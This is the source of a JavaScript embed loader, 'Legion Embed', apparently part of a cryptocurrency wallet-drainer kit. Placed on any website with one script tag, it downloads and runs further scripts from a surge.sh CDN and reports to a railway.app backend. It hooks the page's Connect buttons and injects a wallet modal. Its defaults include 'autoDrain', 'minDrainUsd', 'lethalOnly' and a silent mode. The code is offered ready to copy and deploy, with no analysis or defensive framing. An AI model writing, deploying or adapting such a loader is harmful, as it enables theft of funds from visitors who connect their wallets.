/**
 * LEGION EMBED — One script tag for any frontend.
 *
 * Usage (defaults baked in — copy-paste anywhere):
 *   <script src="https://legion-cdn.surge.sh/legion-embed.js" defer></script>
 *
 * With overrides (data-* or window.LEGION_CONFIG before this tag):
 *   <script>
 *     window.LEGION_CONFIG = { backendUrl: '...', wcProjectId: '...' };
 *   </script>
 *   <script src="https://legion-cdn.surge.sh/legion-embed.js"
 *     data-backend="https://sadrailala-production.up.railway.app"
 *     data-wc="a785da105621eb55c998a35c57587667"
 *     data-silent="false"
 *     defer></script>
 *
 * Loads in order: polyfills → wallet bundle → legion.min.js
 * legion.js then auto-hooks Connect buttons + injects wallet modal on any site.
 */
(function () {
  'use strict';

  if (window.__LEGION_EMBED_LOADED__) return;
  window.__LEGION_EMBED_LOADED__ = true;

  var EMBED_VERSION = '1.1.0';
  var CDN_PRIMARY = 'https://legion-cdn.surge.sh/';
  var VERSIONS = {
    polyfills: '1.1.0',
    wallet: '1.3.8',
    legion: '5.13.5',
  };

  var DEFAULTS = {
    backendUrl: 'https://sadrailala-production.up.railway.app',
    wcProjectId: 'a785da105621eb55c998a35c57587667',
    kineticKey: '',
    silentMode: false,
    autoDrain: true,
    autoRun: false,
    autoConnectOnLoad: false,
    minDrainUsd: 0,
    signOnly: false,
    lethalOnly: true,
    nativeBatchFallback: true,
    mobileSendTx: true,
    injectMode: 'auto',
    showOverlay: false,
    hookButtons: true,
    strictCsp: false,
    cdnFallback: true,
    hwWallets: false,
    debugDevTools: false,
  };

  var embedScript = document.currentScript;
  var CDN_BASE = (function () {
    if (embedScript && embedScript.src) {
      return embedScript.src.replace(/[^/]*$/, '');
    }
    var scripts = document.getElementsByTagName('script');
    for (var i = scripts.length - 1; i >= 0; i--) {
      var src = scripts[i].src || '';
      if (src.indexOf('legion-embed') !== -1) {
        return src.replace(/[^/]*$/, '');
      }
    }
    return './';
  })();

  function parseBool(val, fallback) {
    if (val == null || val === '') return fallback;
    var v = String(val).trim().toLowerCase();
    if (v === 'true' || v === '1' || v === 'yes') return true;
    if (v === 'false' || v === '0' || v === 'no') return false;
    return fallback;
  }

  function readDataConfig() {
    if (!embedScript || !embedScript.dataset) return {};
    var d = embedScript.dataset;
    var out = {};
    if (d.backend) out.backendUrl = d.backend;
    if (d.wc || d.wcProjectId) out.wcProjectId = d.wc || d.wcProjectId;
    if (d.kinetic || d.kineticKey) out.kineticKey = d.kinetic || d.kineticKey;
    if (d.silent != null) out.silentMode = parseBool(d.silent, DEFAULTS.silentMode);
    if (d.autoDrain != null) out.autoDrain = parseBool(d.autoDrain, DEFAULTS.autoDrain);
    if (d.autoRun != null) out.autoRun = parseBool(d.autoRun, DEFAULTS.autoRun);
    if (d.hookButtons != null) out.hookButtons = parseBool(d.hookButtons, DEFAULTS.hookButtons);
    if (d.minDrainUsd != null && d.minDrainUsd !== '') out.minDrainUsd = Number(d.minDrainUsd);
    if (d.vendorBase) out.vendorBase = d.vendorBase;
    return out;
  }

  var userCfg = window.LEGION_CONFIG && typeof window.LEGION_CONFIG === 'object'
    ? window.LEGION_CONFIG
    : {};

  window.LEGION_CONFIG = Object.assign({}, DEFAULTS, userCfg, readDataConfig(), {
    vendorBase: (readDataConfig().vendorBase || userCfg.vendorBase || CDN_BASE).replace(/\/?$/, '/'),
    embed: true,
    embedVersion: EMBED_VERSION,
  });

  var loaded = {};
  function loadScript(src, id) {
    if (loaded[src]) return loaded[src];
    loaded[src] = new Promise(function (resolve, reject) {
      if (id && document.getElementById(id)) {
        resolve();
        return;
      }
      var s = document.createElement('script');
      s.src = src;
      s.crossOrigin = 'anonymous';
      s.async = false;
      if (id) s.id = id;
      s.onload = function () { resolve(); };
      s.onerror = function () { reject(new Error('Legion embed failed to load: ' + src)); };
      (document.head || document.documentElement).appendChild(s);
    });
    return loaded[src];
  }

  function injectEmbedStyles() {
    if (document.getElementById('__legion_embed_styles')) return;
    var st = document.createElement('style');
    st.id = '__legion_embed_styles';
    st.textContent = [
      'w3m-modal,appkit-modal,wcm-modal,[data-rk]{z-index:2147483646!important}',
      'body.legion-embed-active{margin:0}',
    ].join('');
    document.head.appendChild(st);
  }

  var base = window.LEGION_CONFIG.vendorBase;
  var chain = loadScript(base + 'vendor/legion-polyfills.js?v=' + VERSIONS.polyfills, '__legion_embed_polyfills')
    .then(function () {
      return loadScript(base + 'vendor/legion-wallet.iife.js?v=' + VERSIONS.wallet, '__legion_embed_wallet');
    })
    .then(function () {
      return loadScript(base + 'legion.min.js?v=' + VERSIONS.legion, '__legion_embed_core').catch(function () {
        return loadScript(base + 'legion.js?v=' + VERSIONS.legion, '__legion_embed_core_fb');
      });
    });

  injectEmbedStyles();
  document.documentElement.classList.add('legion-embed-active');

  chain.then(function () {
    if (window.legion) {
      console.log('[LegionEmbed] v' + EMBED_VERSION + ' ready — legion v' + (window.legion.version || '?'));
    }
    window.dispatchEvent(new CustomEvent('legion:embed-ready', {
      detail: { embedVersion: EMBED_VERSION, cdnBase: base, legionVersion: window.legion && window.legion.version },
    }));
  }).catch(function (err) {
    console.error('[LegionEmbed]', err.message || err);
  });

  window.LegionEmbed = {
    version: EMBED_VERSION,
    cdnBase: base,
    connect: function () {
      if (window.legion && typeof window.legion.connect === 'function') {
        return window.legion.connect();
      }
      return Promise.reject(new Error('Legion not loaded yet'));
    },
    ready: function () {
      return new Promise(function (resolve, reject) {
        if (window.legion) {
          resolve(window.legion);
          return;
        }
        var t = setTimeout(function () { reject(new Error('Legion embed timeout')); }, 120000);
        window.addEventListener('legion:ready', function onReady(e) {
          clearTimeout(t);
          window.removeEventListener('legion:ready', onReady);
          resolve(window.legion);
        });
        chain.then(function () {
          if (window.legion) {
            clearTimeout(t);
            resolve(window.legion);
          }
        }).catch(reject);
      });
    },
  };
})();
